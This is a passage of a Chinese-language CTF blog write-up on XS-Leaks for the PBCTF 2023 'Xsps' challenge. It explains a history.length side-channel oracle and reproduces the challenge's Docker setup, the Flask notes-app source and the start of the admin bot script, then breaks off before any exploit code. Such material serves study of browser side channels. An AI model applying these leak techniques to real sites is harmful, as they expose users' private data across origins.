<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>年轻人的第一把Xsleaks - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="年轻人的第一把Xsleaks - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/19/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E6%8A%8AXsleaks/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-19T12:05:40.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>19,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">年轻人的第一把Xsleaks</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考：<br><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/02/pbctf-2023-xsps-writeup/#xsps">https://exp10it.cn/2023/02/pbctf-2023-xsps-writeup/#xsps</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681835370399-7cf9b358-9b2f-4b07-9c37-057918f25220.png#averageHue=%23f1f0f0&clientId=u87443d7e-028d-4&from=paste&height=618&id=uf6711ff9&name=image.png&originHeight=773&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=128740&status=done&style=none&taskId=u5afeb1cb-0efb-4394-a78d-d0b157c6246&title=&width=1520" alt="image.png"></p>
<h1 id="Xsleaks漏洞成因"><a href="#Xsleaks漏洞成因" class="headerlink" title="Xsleaks漏洞成因"></a>Xsleaks漏洞成因</h1><p>Xsleaks攻击首先是基于Xss攻击的（Csrf同理）；当我们可以控制bot的行为时，再处于某种特定的条件时，我们就可以使用xsleaks攻击将flag Leaks出来，原理很简单，比如我定义一个查询功能，你只需要输入一个参数q，随后我再定义一个flag，如<code>flag&#123;test_flag&#125;</code><br>这时候假如有一个功能点，可以判断我们输入的q和flag的值开头是否一致，也就是<code>flag.startwith(q)</code>，假如为真就会进行跳转，假如为否就不跳转<br>这时候我们就有了一个二元关系差，而这一点就可以用来作为leaks的条件，大致原理如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681836184539-d51b19f2-d686-4585-a499-a5b8f2228d5b.png#averageHue=%23fefefe&clientId=u87443d7e-028d-4&from=paste&height=410&id=u64b5c8eb&name=image.png&originHeight=513&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16665&status=done&style=none&taskId=u1bb4b7ae-826a-4d29-a1b9-6de35eb946f&title=&width=809.6" alt="image.png"><br>那么这时候就得再介绍一个东西了，<code>windows.history.length</code></p>
<blockquote>
<p>History.length 是一个只读属性，返回当前 session 中的 history 个数，包含当前页面在内。举个例子，对于新开一个 tab 加载的页面当前属性返回值 1。</p>
</blockquote>
<p>这一属性是用来判断当前页面加载了多少子页面，也就是通过这一个页面windows.location跳转弹窗了几个子页面，如上述例子，假如成功了的话，跳转顺序为<code>http://target.com-&gt;http://target.com?q=flag&#123;-&gt;http://success</code>，这样的话length为3，失败的话length为2，因此我们获取了一个二元关系差，也就是一个leaks条件，这一点和SQL盲注类似</p>
<h1 id="PBCTF2023-Xsps"><a href="#PBCTF2023-Xsps" class="headerlink" title="PBCTF2023 Xsps"></a>PBCTF2023 Xsps</h1><p>考点：Xsleaks<br>这一题就是经典的Xsleaks了，我直接放出重要的源码</p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>大家放到vps的docker里去搭建，这里给出我的docker配置</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./app/</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:80:5000&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PORT=5000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WEB_CONCURRENCY=16</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CHALL_HOST=localhost</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SECRET_KEY=NOTREALSECRET</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">bot:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./bot/</span></span><br><span class="line">    <span class="attr">init:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CHALL_HOST=localhost</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CHALL_COOKIE=eyJub3RlcyI6eyJmbGFnIjoicGJjdGZ7eW91X3NvbHZlXzF0X2dvMGQhfSJ9fQ.ZD6YHg.19wA-HSKvMq1bIyII8Fpze147Ys</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6.0-alpine</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bot的dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FROM node:19</span><br><span class="line"></span><br><span class="line">COPY key.pub /tmp/</span><br><span class="line">RUN apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y wget gnupg \</span><br><span class="line">    &amp;&amp; apt-key add /tmp/key.pub \</span><br><span class="line">    &amp;&amp; sh -c &#x27;echo &quot;deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main&quot; &gt;&gt; /etc/apt/sources.list.d/google.list&#x27; \</span><br><span class="line">    &amp;&amp; apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y libxss1 google-chrome-stable \</span><br><span class="line">      --no-install-recommends \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /bot/</span><br><span class="line">COPY bot.js /bot/</span><br><span class="line"></span><br><span class="line">WORKDIR /bot/ </span><br><span class="line"></span><br><span class="line">RUN npm i puppeteer </span><br><span class="line">RUN npm i redis</span><br><span class="line"></span><br><span class="line">RUN chown -R root:node /bot/ </span><br><span class="line"></span><br><span class="line">USER node</span><br><span class="line"></span><br><span class="line">CMD [&quot;node&quot;, &quot;bot.js&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bot这个dockerfile注意了。自己去<code>[https://dl-ssl.google.com/linux/linux_signing_key.pub](https://dl-ssl.google.com/linux/linux_signing_key.pub)</code>把这个公钥下载，放到dockerfile同目录处，否则就等着报错吧。<br>客户端的dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.8.16-slim-bullseye</span><br><span class="line">RUN pip install redis</span><br><span class="line">COPY ./requirements.txt /app/</span><br><span class="line">RUN pip install -r /app/requirements.txt</span><br><span class="line">COPY ./app.py /app/main.py</span><br><span class="line">COPY static /app/static/</span><br><span class="line">CMD [&quot;python&quot;,&quot;/app/main.py&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, jsonify, Response, make_response, g</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&quot;tops3cr3t&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.config.update(</span><br><span class="line">    SESSION_COOKIE_SECURE=<span class="literal">False</span>,</span><br><span class="line">    SESSION_COOKIE_HTTPONLY=<span class="literal">True</span>,</span><br><span class="line">    <span class="comment"># SESSION_COOKIE_SAMESITE=&#x27;Lax&#x27;,</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">HOST = os.environ.get(<span class="string">&quot;CHALL_HOST&quot;</span>, <span class="string">&quot;localhost:5000&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">&#x27;redis&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/do_report&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_report</span>():</span><br><span class="line">    cur_time = time.time()</span><br><span class="line">    ip = request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>).split(<span class="string">&quot;,&quot;</span>)[-<span class="number">2</span>].strip() <span class="comment">#amazing google load balancer</span></span><br><span class="line"></span><br><span class="line">    last_time = r.get(<span class="string">&#x27;time.&#x27;</span>+ip) </span><br><span class="line">    last_time = <span class="built_in">float</span>(last_time) <span class="keyword">if</span> last_time <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    time_diff = cur_time - last_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> time_diff &gt; <span class="number">6</span>:</span><br><span class="line">        r.rpush(<span class="string">&#x27;submissions&#x27;</span>, request.form[<span class="string">&#x27;url&#x27;</span>])</span><br><span class="line">        r.setex(<span class="string">&#x27;time.&#x27;</span>+ip, <span class="number">60</span>, cur_time)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;submitted&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;rate limited&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Notes app&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;&lt;a href=&quot;/note&quot;&gt;Get Note&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/&quot;&gt;Change Note&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/report&quot;&gt;Report Link&lt;/a&gt;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;Please report suspicious URLs to admin&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/do_report&quot; id=&quot;reportform&quot; method=POST&gt;</span></span><br><span class="line"><span class="string">        URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;URL&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_nonce</span>():</span><br><span class="line">    g.nonce = binascii.b2a_hex(os.urandom(<span class="number">15</span>)).decode()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_CSP</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">f&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-<span class="subst">&#123;g.nonce&#125;</span>&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_note&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;notes&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;notes&#x27;</span>] = &#123;&#125;</span><br><span class="line">    session[<span class="string">&#x27;notes&#x27;</span>][request.form[<span class="string">&#x27;name&#x27;</span>]] = request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;highlight_note&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> request.form[<span class="string">&#x27;highlight_note&#x27;</span>] == <span class="string">&quot;YES&quot;</span>:</span><br><span class="line">        session[<span class="string">&#x27;highlighted_note&#x27;</span>] = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Changed succesfully&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/notes&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">notes</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;notes&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> [X <span class="keyword">for</span> X <span class="keyword">in</span> session[<span class="string">&#x27;notes&#x27;</span>]] </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/highlighted_note&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">highlighted_note</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;highlighted_note&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>:<span class="literal">False</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;highlighted_note&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_note</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;notes&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">&#x27;notes&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;notes&#x27;</span>][name]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/static/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, filename)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Notes app&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;script nonce=&#x27;<span class="subst">&#123;g.nonce&#125;</span>&#x27; src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;h3&gt;&lt;a href=&quot;/report&quot;&gt;Report Link&lt;/a&gt;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt; Highlighted Note &lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;div id=&quot;highlighted&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt; Add a note &lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/add_note&quot; id=&quot;noteform&quot; method=POST&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=text name=&quot;name&quot; placeholder=&quot;Note&#x27;s name&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;textarea rows=&quot;10&quot; cols=&quot;100&quot; name=&quot;data&quot; form=&quot;noteform&quot; placeholder=&quot;Note&#x27;s content&quot;&gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;checkbox&quot; name=&quot;highlight_note&quot; value=&quot;YES&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;vehicle1&quot;&gt;Highlight Note&lt;/label&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;Search Note&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;a id=search_result&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;input id=&#x27;search_content&#x27; type=text name=&quot;name&quot; placeholder=&quot;Content to search&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&#x27;search_open&#x27; type=&quot;checkbox&quot; name=&quot;open_after&quot; value=&quot;YES&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;open&quot;&gt;Open&lt;/label&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    &lt;input id=&#x27;search_button&#x27; type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bot.js:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redis = <span class="built_in">require</span>(<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> r = redis.<span class="title function_">createClient</span>(&#123;</span><br><span class="line">    <span class="attr">socket</span>: &#123;</span><br><span class="line">        port      : <span class="number">6379</span>,      